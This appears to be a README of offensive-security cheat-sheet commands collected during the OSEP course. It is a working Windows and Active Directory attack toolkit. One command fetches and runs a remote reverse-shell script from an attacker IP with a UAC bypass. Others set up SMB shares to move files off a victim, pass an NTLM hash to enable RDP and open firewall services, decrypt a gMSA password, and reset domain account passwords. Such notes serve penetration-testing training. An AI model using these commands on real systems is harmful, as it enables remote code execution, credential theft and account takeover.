Just a bunch of tools built/gathered along the OSEP course.

# <ins>Useful Basic Commands</ins>:

### <ins>Run command as another user</ins>:
- `Invoke-RunasCs amit 'Password123!' 'powershell iex(iwr http://192.168.45.185/rev.txt -usebasicparsing)' -ForceProfile -CreateProcessFunction 2 -BypassUac`

### <ins>Set up SMB server (file transfer)</ins>:
- `smbserver.py share $(pwd) -smb2support -username amit -password password`
- On Victim: `net use \\192.168.45.223\share /U:amit password`
- Copy files: `copy <FILENAME> \\192.168.45.223\share`

### <ins>Enable RDP and RestrictedAdmin from both Local/Remote</ins>:

Using command prompt: 
- `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f && reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0 && netsh firewall set service remoteadmin enable && netsh firewall set service remotedesktop enable` 

Using netexec:
- `netexec smb db01 -u administrator -H faf3185b0a608ce2f8afb6f8d133f85b --local-auth -X 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f;reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0;netsh firewall set service remoteadmin enable;netsh firewall set service remotedesktop enable' --exec-method atexec`

### <ins>RDP to host using xfreerdp</ins>:
- `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' +dynamic-resolution +clipboard`

# <ins>BloodHound Dacls Abuse</ins>

### GMSAPasswordReader

Decrypt the gmsa password

    $gmsa = Get-ADServiceAccount -Identity bir-adfs-gmsa -Properties msDS-ManagedPassword
    $mp = $gmsa.'msDS-ManagedPassword'
    $mp // Get the password in numbers
    ConvertFrom-ADManagedPasswordBlob $mp

If the clear-text password not appear, let's just use it.

    $password = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
    $cred = New-Object System.Management.Automation.PSCredential "GroupName" , $password

Now we got the credentials Objects, let's open a new session with the privileged user:

    Invoke-Command -ComputerName 127.0.0.1 -cred $cred -ScriptBlock {net user DomainAdminmUser P@ssw0rd1!}
    Invoke-Command -ComputerName 127.0.0.1 -Credential $cred -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password1234!' -Force)}
